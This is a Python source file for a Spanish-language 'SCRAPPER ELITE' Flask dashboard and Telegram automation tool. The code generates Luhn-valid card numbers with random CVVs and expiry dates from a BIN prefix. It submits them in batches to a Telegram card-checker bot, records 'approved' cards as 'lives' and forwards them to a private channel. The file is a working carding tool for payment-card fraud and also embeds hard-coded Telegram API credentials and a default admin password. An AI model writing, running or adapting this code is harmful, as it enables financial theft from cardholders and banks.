#!/usr/bin/env python3
import threading
import asyncio
import random
import time
import os
import sys
import json
import sqlite3
import secrets
import re
from functools import wraps
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, redirect, session, url_for
from werkzeug.security import generate_password_hash, check_password_hash
try:
    from telethon import TelegramClient, events
    from telethon.errors import SessionPasswordNeededError
    TELETHON_AVAILABLE = True
except:
    TELETHON_AVAILABLE = False

try:
    from dotenv import load_dotenv
    load_dotenv()
except:
    pass

# ============ CONFIG ============
API_ID = int(os.environ.get('API_ID', '22154650'))
API_HASH = os.environ.get('API_HASH', '2b554e270efb419af271c47ffe1d72d3')
SESSION_NAME = 'session_secure'
PORT = int(os.environ.get('PORT', 8080))
PHONE_NUMBER = os.environ.get('PHONE_NUMBER', '')

# ============ GLOBALS ============
if TELETHON_AVAILABLE:
    client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
else:
    client = None

log_messages = []
lives_list = []
sent_ccs = []
response_messages = []
approved_count = 0
declined_count = 0
total_sent = 0
total_checked = 0
channelid = -1003101739772
client_connected = False
start_time = datetime.now()

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.permanent_session_lifetime = timedelta(days=7)

# ============ FILES ============
LIVES_FILE = 'lives_database.json'
DB_FILE = 'users.db'
OWNER_CONFIG_FILE = 'owner_config.json'
SENT_CCS_FILE = 'sent_ccs.json'
RESPONSES_FILE = 'responses.json'

OWNER_CONFIG = None

# ============ OWNER CONFIG ============
def init_owner_config():
    global OWNER_CONFIG
    if os.path.exists(OWNER_CONFIG_FILE):
        try:
            with open(OWNER_CONFIG_FILE, 'r') as f:
                OWNER_CONFIG = json.load(f)
                return OWNER_CONFIG
        except:
            pass
    
    config = {
        "secret_url": secrets.token_urlsafe(32),
        "username": "admin",
        "password": "ChangeMe123!@#",
        "created_at": datetime.now().isoformat()
    }
    
    with open(OWNER_CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)
    
    OWNER_CONFIG = config
    print(f"\n{'='*100}")
    print(f"🔐 OWNER CONFIG CREADA")
    print(f"URL: /secret/{config['secret_url']}/owner_login")
    print(f"Usuario: {config['username']}")
    print(f"Contraseña: {config['password']}")
    print(f"{'='*100}\n")
    return config

def get_owner_config():
    global OWNER_CONFIG
    if OWNER_CONFIG is None:
        init_owner_config()
    return OWNER_CONFIG

# ============ DB ============
def init_db():
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            email TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            role TEXT DEFAULT 'user',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_login TIMESTAMP,
            is_active INTEGER DEFAULT 1,
            failed_attempts INTEGER DEFAULT 0,
            locked_until TIMESTAMP
        )''')
        conn.commit()
        conn.close()
        print("✅ DB inicializada")
    except Exception as e:
        print(f"❌ DB Error: {e}")

def get_db():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

def load_files():
    global lives_list, sent_ccs, response_messages
    try:
        if os.path.exists(LIVES_FILE):
            with open(LIVES_FILE, 'r', encoding='utf-8') as f:
                lives_list = json.load(f)
    except:
        lives_list = []
    try:
        if os.path.exists(SENT_CCS_FILE):
            with open(SENT_CCS_FILE, 'r') as f:
                sent_ccs = json.load(f)
    except:
        sent_ccs = []
    try:
        if os.path.exists(RESPONSES_FILE):
            with open(RESPONSES_FILE, 'r', encoding='utf-8') as f:
                response_messages = json.load(f)
    except:
        response_messages = []

def save_files():
    try:
        with open(LIVES_FILE, 'w', encoding='utf-8') as f:
            json.dump(lives_list[-100:], f, indent=2, ensure_ascii=False)
    except:
        pass
    try:
        with open(SENT_CCS_FILE, 'w') as f:
            json.dump(sent_ccs[-1000:], f, indent=2)
    except:
        pass
    try:
        with open(RESPONSES_FILE, 'w', encoding='utf-8') as f:
            json.dump(response_messages[-500:], f, indent=2, ensure_ascii=False)
    except:
        pass

def check_brute_force(username):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT failed_attempts, locked_until FROM users WHERE username = ?', (username,))
        user = c.fetchone()
        conn.close()
        if user and user['locked_until']:
            if datetime.fromisoformat(user['locked_until']) > datetime.now():
                return True
    except:
        pass
    return False

def increment_failed_attempts(username):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT failed_attempts FROM users WHERE username = ?', (username,))
        user = c.fetchone()
        if user:
            new_attempts = user['failed_attempts'] + 1
            if new_attempts >= 5:
                lock_time = (datetime.now() + timedelta(minutes=15)).isoformat()
                c.execute('UPDATE users SET failed_attempts = ?, locked_until = ? WHERE username = ?',
                         (new_attempts, lock_time, username))
            else:
                c.execute('UPDATE users SET failed_attempts = ? WHERE username = ?', (new_attempts, username))
            conn.commit()
        conn.close()
    except:
        pass

def reset_failed_attempts(username):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('UPDATE users SET failed_attempts = 0, locked_until = NULL WHERE username = ?', (username,))
        conn.commit()
        conn.close()
    except:
        pass

# ============ DECORADORES ============
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ============ LUHN ============
def luhn_checksum(card_number):
    digits = [int(d) for d in str(card_number)]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum([int(x) for x in str(d * 2)])
    return checksum % 10

def generate_luhn_digit(partial_card):
    check_digit = luhn_checksum(str(partial_card) + '0')
    return (10 - check_digit) % 10

def is_date_valid(month, year):
    try:
        month = int(month)
        year = int(year)
        if year <= 30:
            year += 2000
        elif year <= 99:
            year += 1900
        if month == 12:
            expiry = datetime(year + 1, 1, 1) - timedelta(days=1)
        else:
            expiry = datetime(year, month + 1, 1) - timedelta(days=1)
        return expiry >= datetime.now()
    except:
        return False

def generate_random_valid_date():
    future = datetime.now() + timedelta(days=random.randint(0, 365 * 5))
    return f"{future.month:02d}", str(future.year)

def generate_cc_variants(ccbase, count=20):
    if ',' in ccbase:
        separator = ','
    elif '|' in ccbase:
        separator = '|'
    else:
        return []
    
    parts = ccbase.strip().split(separator)
    if len(parts) < 4:
        return []
    
    cardnumber = parts[0].strip()
    month = parts[1].strip()
    year = parts[2].strip()
    
    if len(cardnumber) < 12:
        return []
    
    if not is_date_valid(month, year):
        month, year = generate_random_valid_date()
    
    bin_number = cardnumber[:-4]
    variants = []
    
    for i in range(count):
        random_digits = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        partial = bin_number + random_digits
        luhn_digit = generate_luhn_digit(partial)
        complete = partial + str(luhn_digit)
        cvv = random.randint(100, 999)
        variant = f"{complete}{separator}{month}{separator}{year}{separator}{cvv}"
        if variant not in variants:
            variants.append(variant)
    
    return variants

# ============ TELETHON ============

async def response_handler(event):
    global approved_count, declined_count, lives_list, total_checked
    try:
        full_message = event.message.message if event.message.message else ""
        message_lower = full_message.lower()
        total_checked += 1
        
        if "✅" in full_message or "approved" in message_lower or "valid" in message_lower:
            approved_count += 1
            log_messages.append(f"✅ LIVE DETECTADA")
            
            lines = full_message.split('\n')
            data = {
                "cc": "",
                "status": "✅ APPROVED",
                "response": full_message,
                "country": "🌍 Unknown",
                "bank": "🏦 Unknown",
                "type": "💳 VISA",
                "gate": "AlphaChecker",
                "bin": "",
                "avs": "Match",
                "cvv": "Match",
                "zip": "Match",
                "address": "Match",
                "amount": "N/A",
                "currency": "USD",
                "processor": "Stripe",
                "error": "",
                "reason": "APPROVED",
                "code": "00",
                "descriptor": "APPROVED",
                "merchant": "Merchant",
                "raw": full_message,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            
            for line in lines:
                line_lower = line.lower()
                if 'cc:' in line_lower:
                    data["cc"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'bank:' in line_lower:
                    data["bank"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'country:' in line_lower:
                    data["country"] = line.split(':', 1)[1].strip() if ':' in line else ""
            
            lives_list.append(data)
            save_files()
            
            if client and TELETHON_AVAILABLE:
                try:
                    msg = f"🟢 LIVE\n💳 {data['cc']}\n✅ APPROVED\n🏦 {data['bank']}\n🌍 {data['country']}\n⏰ {data['timestamp']}"
                    await client.send_message(channelid, msg)
                    log_messages.append(f"📤 ENVIADO AL CANAL")
                except:
                    pass
        
        elif "❌" in full_message or "declined" in message_lower:
            declined_count += 1
            log_messages.append(f"❌ DECLINADA")
        
        if len(log_messages) > 100:
            log_messages.pop(0)
    except:
        pass

async def load_commands():
    try:
        if os.path.exists('cmds.txt'):
            with open('cmds.txt', 'r') as f:
                cmds = [line.strip() for line in f if line.strip()]
                if cmds:
                    return cmds
    except:
        pass
    return ['/check']

async def send_to_bot():
    global total_sent, client_connected
    while True:
        try:
            if not client_connected or not client:
                await asyncio.sleep(5)
                continue
            
            if not os.path.exists('ccs.txt'):
                await asyncio.sleep(30)
                continue
            
            with open('ccs.txt', 'r') as f:
                ccs_list = f.readlines()
            
            if ccs_list:
                current_cc = ccs_list[0].strip()
                if len(ccs_list) > 1:
                    with open('ccs.txt', 'w') as f:
                        f.writelines(ccs_list[1:])
                else:
                    with open('ccs.txt', 'w') as f:
                        f.write("")
                
                log_messages.append(f"🔄 BIN: {current_cc[:12]}...")
                cc_variants = generate_cc_variants(current_cc, count=20)
                
                if not cc_variants:
                    await asyncio.sleep(20)
                    continue
                
                commands = await load_commands()
                
                for i in range(len(cc_variants)):
                    try:
                        selected_command = random.choice(commands)
                        message = f"{selected_command} {cc_variants[i]}"
                        await client.send_message('@Alphachekerbot', message)
                        sent_ccs.append({
                            "cc": cc_variants[i],
                            "timestamp": datetime.now().isoformat()
                        })
                        total_sent += 1
                        log_messages.append(f"✓ #{i+1}/20")
                        await asyncio.sleep(1)
                    except:
                        pass
                
                save_files()
                log_messages.append(f"🎉 LOTE COMPLETADO")
                await asyncio.sleep(21)
            else:
                await asyncio.sleep(30)
        except Exception as e:
            await asyncio.sleep(30)

async def start_client():
    global client_connected
    if not client or not TELETHON_AVAILABLE:
        print("⚠️ Telethon no disponible")
        return
    
    try:
        print("🚀 Telethon iniciando...")
        log_messages.append("🚀 Telethon iniciando...")
        
        if not await client.is_user_authorized():
            print("⚠️ Sin sesión. Ejecuta local: python app.py")
            log_messages.append("⚠️ Necesita autenticación local")
            return
        
        await client.start()
        client_connected = True
        log_messages.append("✅ Telethon CONECTADO")
        print("✅ Telethon conectado")
        
        client.add_event_handler(response_handler, events.MessageEdited(chats='@Alphachekerbot'))
        await asyncio.gather(send_to_bot(), client.run_until_disconnected())
    except EOFError:
        print("⚠️ EOF (sin stdin). Usa sesión local.")
        log_messages.append("⚠️ EOF Error")
    except Exception as e:
        print(f"❌ Error: {str(e)[:100]}")
        log_messages.append(f"❌ Error: {str(e)[:100]}")
        client_connected = False
        await asyncio.sleep(30)

def telethon_thread_fn():
    if not TELETHON_AVAILABLE:
        return
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(start_client())
    except:
        pass

# ============ RUTAS ============

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        
        if not username or not password:
            return jsonify({'error': 'Campos requeridos'}), 400
        
        if check_brute_force(username):
            return jsonify({'error': 'Bloqueado 15min'}), 429
        
        try:
            conn = get_db()
            c = conn.cursor()
            c.execute('SELECT id, username, password_hash, is_active FROM users WHERE username = ?', (username,))
            user = c.fetchone()
            conn.close()
            
            if not user or not user['is_active']:
                increment_failed_attempts(username)
                return jsonify({'error': 'No encontrado'}), 401
            
            if not check_password_hash(user['password_hash'], password):
                increment_failed_attempts(username)
                return jsonify({'error': 'Contraseña incorrecta'}), 401
            
            reset_failed_attempts(username)
            session['user_id'] = user['id']
            session['username'] = user['username']
            session.permanent = True
            
            conn = get_db()
            c = conn.cursor()
            c.execute('UPDATE users SET last_login = ? WHERE id = ?', (datetime.now().isoformat(), user['id']))
            conn.commit()
            conn.close()
            
            return jsonify({'success': True, 'redirect': url_for('dashboard')})
        except:
            return jsonify({'error': 'Error servidor'}), 500
    
    html = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SCRAPPER LOGIN</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#0a0e27 0%,#1a1a3e 30%,#2d1b3d 60%);font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
.login{background:rgba(255,20,20,0.07);border:3px solid #ff1414;border-radius:30px;padding:70px 60px;max-width:500px;width:100%;box-shadow:0 0 100px rgba(255,20,20,0.3);backdrop-filter:blur(20px);animation:slideUp 0.8s}
h1{color:#ff1414;text-align:center;font-size:3em;margin-bottom:10px;letter-spacing:3px;font-weight:900;text-shadow:0 0 30px rgba(255,20,20,0.8)}
p{color:#ffaa00;text-align:center;margin-bottom:35px;letter-spacing:1px}
.form-group{margin-bottom:30px}
.form-group label{display:block;color:#ffaa00;margin-bottom:12px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px}
.form-group input{width:100%;padding:16px 20px;background:rgba(0,0,0,0.4);border:2px solid #ff1414;border-radius:12px;color:#fff;font-size:1.05em;transition:all 0.4s;box-shadow:inset 0 2px 8px rgba(0,0,0,0.3)}
.form-group input:focus{outline:none;border-color:#ffaa00;box-shadow:0 0 30px rgba(255,170,0,0.6);transform:translateY(-2px)}
button{width:100%;padding:16px;background:linear-gradient(135deg,#ff1414,#cc0000);border:3px solid #ffaa00;border-radius:12px;color:white;font-weight:900;font-size:1.15em;cursor:pointer;text-transform:uppercase;transition:all 0.4s;box-shadow:0 8px 30px rgba(255,20,20,0.5);letter-spacing:2px}
button:hover{transform:translateY(-3px);box-shadow:0 12px 50px rgba(255,20,20,0.7)}
.error{color:#ff6b6b;text-align:center;margin-bottom:20px;font-weight:700;padding:15px;background:rgba(255,20,20,0.15);border-left:4px solid #ff1414;display:none;border-radius:8px}
@keyframes slideUp{from{opacity:0;transform:translateY(40px)}to{opacity:1;transform:translateY(0)}}
</style></head><body>
<div class="login"><h1>🔐 SCRAPPER</h1><p>Team RedCards Elite VIP</p>
<div id="error" class="error"></div>
<form id="form"><div class="form-group"><label>👤 Usuario</label><input type="text" name="username" required></div>
<div class="form-group"><label>🔑 Contraseña</label><input type="password" name="password" required></div>
<button type="submit">🚀 ENTRAR</button></form></div>
<script>document.getElementById('form').addEventListener('submit',function(e){e.preventDefault();fetch('/login',{method:'POST',body:new FormData(this)}).then(r=>r.json()).then(d=>{if(d.success)window.location.href=d.redirect;else{document.getElementById('error').textContent='❌ '+d.error;document.getElementById('error').style.display='block';}});});</script>
</body></html>'''
    return render_template_string(html)

@app.route('/dashboard')
@login_required
def dashboard():
    html = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SCRAPPER DASHBOARD</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#0a0e27,#1a1a3e,#2d1b3d);font-family:'Segoe UI',sans-serif;color:#fff;min-height:100vh;padding:25px}::selection{background:#ff1414}
.container{max-width:1920px;margin:0 auto}
.top-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;padding:25px 40px;background:linear-gradient(135deg,rgba(255,20,20,0.2),rgba(20,20,255,0.1));border:3px solid #ff1414;border-radius:20px;box-shadow:0 15px 50px rgba(255,20,20,0.2)}
.user{color:#ffaa00;font-weight:bold;font-size:1.2em}
.logout{background:linear-gradient(135deg,#ff1414,#cc0000);border:3px solid #ffaa00;color:white;padding:14px 30px;border-radius:10px;cursor:pointer;font-weight:bold;text-transform:uppercase;transition:all 0.3s}
.logout:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(255,20,20,0.5)}
.header{text-align:center;padding:60px 50px;background:linear-gradient(135deg,rgba(255,20,20,0.15),rgba(255,20,20,0.08));border:4px solid #ff1414;border-radius:25px;margin-bottom:50px;box-shadow:0 20px 60px rgba(255,20,20,0.2)}
.header h1{font-size:4.5em;color:#ff1414;text-shadow:0 0 40px rgba(255,20,20,0.9);letter-spacing:3px;margin-bottom:15px}
.header p{color:#ffaa00;font-size:1.15em}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:30px;margin-bottom:50px}
.stat{background:linear-gradient(135deg,rgba(255,20,20,0.15),rgba(255,20,20,0.08));padding:50px;border-radius:25px;border:4px solid #ff1414;text-align:center;box-shadow:0 15px 50px rgba(255,20,20,0.2);transition:all 0.4s}
.stat:hover{transform:translateY(-8px);box-shadow:0 25px 70px rgba(255,20,20,0.3);border-color:#ffaa00}
.stat h3{color:#ffaa00;margin-bottom:20px;font-size:1.4em;text-transform:uppercase;letter-spacing:1.5px;font-weight:700}
.stat .num{font-size:6em;font-weight:900;color:#ff1414;text-shadow:0 0 30px rgba(255,20,20,0.6);font-family:monospace}
.stat .icon{font-size:3.5em;margin-bottom:20px}
.main{display:grid;grid-template-columns:1fr 1.3fr;gap:30px;margin-bottom:40px}
.section{background:linear-gradient(135deg,rgba(255,20,20,0.12),rgba(255,20,20,0.05));padding:40px;border-radius:25px;border:3px solid #ff1414;box-shadow:0 15px 50px rgba(255,20,20,0.15)}
.section h2{color:#ffaa00;text-transform:uppercase;font-size:2em;margin-bottom:30px;letter-spacing:1.5px;font-weight:700}
.box{background:rgba(0,0,0,0.7);padding:25px;border-radius:18px;height:650px;overflow-y:auto;border:2px solid #ff1414;box-shadow:inset 0 4px 15px rgba(0,0,0,0.5)}
.item{padding:15px;border-bottom:2px solid rgba(255,20,20,0.3);color:#ffaa00;margin-bottom:8px;border-radius:4px;transition:all 0.3s;font-family:monospace;font-size:0.95em}
.item:hover{background:rgba(255,20,20,0.05)}
.box::-webkit-scrollbar{width:10px}
.box::-webkit-scrollbar-track{background:rgba(0,0,0,0.4);border-radius:10px}
.box::-webkit-scrollbar-thumb{background:#ff1414;border-radius:10px}
.box::-webkit-scrollbar-thumb:hover{background:#ffaa00}
@media (max-width:1400px){.main{grid-template-columns:1fr}}
</style></head><body>
<div class="container">
<div class="top-bar"><div class="user">👤 {{ username }}</div><button class="logout" onclick="location.href='/logout'">🚪 SALIR</button></div>
<div class="header"><h1>🎮 SCRAPPER ELITE 🔴</h1><p>Dashboard Control Real-Time 💎</p></div>
<div class="stats">
<div class="stat"><div class="icon">✅</div><h3>Lives</h3><div class="num" id="app">0</div></div>
<div class="stat"><div class="icon">❌</div><h3>Declinadas</h3><div class="num" id="dec">0</div></div>
<div class="stat"><div class="icon">📤</div><h3>Enviadas</h3><div class="num" id="sen">0</div></div>
<div class="stat"><div class="icon">💎</div><h3>Guardadas</h3><div class="num" id="gua">0</div></div>
</div>
<div class="main">
<div class="section"><h2>📤 CCS ENVIADAS</h2><div class="box" id="ccs"></div></div>
<div class="section"><h2>✅ LIVES ELITE</h2><div class="box" id="liv"></div></div>
</div>
</div>
<script>function update(){fetch('/get_logs').then(r=>r.json()).then(d=>{document.getElementById('app').textContent=d.approved;document.getElementById('dec').textContent=d.declined;});fetch('/get_sent').then(r=>r.json()).then(d=>{document.getElementById('sen').textContent=d.total;const div=document.getElementById('ccs');div.innerHTML=d.sent.slice(-50).reverse().map(s=>`<div class="item">💳 ${s.cc}</div>`).join('');});fetch('/get_lives').then(r=>r.json()).then(d=>{document.getElementById('gua').textContent=d.lives.length;const div=document.getElementById('liv');div.innerHTML=d.lives.slice(-20).reverse().map(l=>`<div class="item">✅ ${l.cc} | ${l.bank} | ${l.country} | ${l.status}</div>`).join('');}); }setInterval(update,1500);update();</script>
</body></html>'''
    return render_template_string(html, username=session.get('username'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/get_logs')
@login_required
def get_logs():
    return jsonify({"approved": approved_count, "declined": declined_count, "logs": log_messages[-50:]})

@app.route('/get_lives')
@login_required
def get_lives():
    return jsonify({"lives": lives_list})

@app.route('/get_sent')
@login_required
def get_sent():
    return jsonify({"sent": sent_ccs[-50:], "total": total_sent})

@app.route('/health')
def health():
    return jsonify({"status": "ok", "approved": approved_count, "declined": declined_count, "sent": total_sent, "lives": len(lives_list)})

# ============ MAIN ============

if __name__ == '__main__':
    print(f"\n{'='*100}")
    print(f"🚀 SCRAPPER ELITE v5.2 - COMPLETAMENTE FUNCIONAL")
    print(f"{'='*100}\n")
    
    init_db()
    init_owner_config()
    load_files()
    
    print(f"✅ Sistema inicializado\n")
    
    if TELETHON_AVAILABLE:
        telethon_thread = threading.Thread(target=telethon_thread_fn, daemon=True)
        telethon_thread.start()
        time.sleep(2)
    
    print(f"\n{'='*100}")
    print(f"🌐 Flask en http://0.0.0.0:{PORT}")
    print(f"🔗 Telethon: {'Disponible' if TELETHON_AVAILABLE else 'No disponible'}")
    print(f"{'='*100}\n")
    
    app.run('0.0.0.0', PORT, debug=False, use_reloader=False, threaded=True)
